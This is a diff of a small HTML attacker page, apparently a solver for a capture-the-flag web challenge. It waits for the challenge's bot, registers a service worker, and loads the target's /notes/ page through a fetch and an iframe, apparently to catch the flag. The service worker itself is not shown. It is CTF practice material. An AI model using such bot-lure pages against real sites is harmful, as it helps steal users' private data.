@@ -1,17 +1,28 @@
 <!DOCTYPE html>
 <html>
-<head><title>Flag Catcher</title></head>
-<body>
-  <h1>Waiting for bot...</h1>
-  <script>
-    navigator.serviceWorker.register("/sw.js").then(() => {
-      setTimeout(() => {
-        let iframe = document.createElement("iframe");
-        iframe.src = "https://fnotes-web.ctf-chal.idek.team/notes/";
-        iframe.style.display = "none";
-        document.body.appendChild(iframe);
-      }, 500); // Slight delay before iframe loads
-    });
-  </script>
-</body>
+  <head><title>Loading Flag</title></head>
+  <body>
+    <h1>Waiting...</h1>
+    <script>
+      navigator.serviceWorker.register("/sw.js").then(() => {
+        console.log("[INFO] Service worker registered.");
+
+        setTimeout(() => {
+          console.log("[INFO] Attempting fetch to /notes/");
+
+          // Method 1: Fetch
+          fetch("https://fnotes-web.ctf-chal.idek.team/notes/")
+            .then(r => r.text())
+            .then(console.log)
+            .catch(e => console.error("[Fetch Error]", e));
+
+          // Method 2: iframe
+          const iframe = document.createElement("iframe");
+          iframe.src = "https://fnotes-web.ctf-chal.idek.team/notes/";
+          document.body.appendChild(iframe);
+        }, 1500);
+      });
+    </script>
+  </body>
 </html>
+
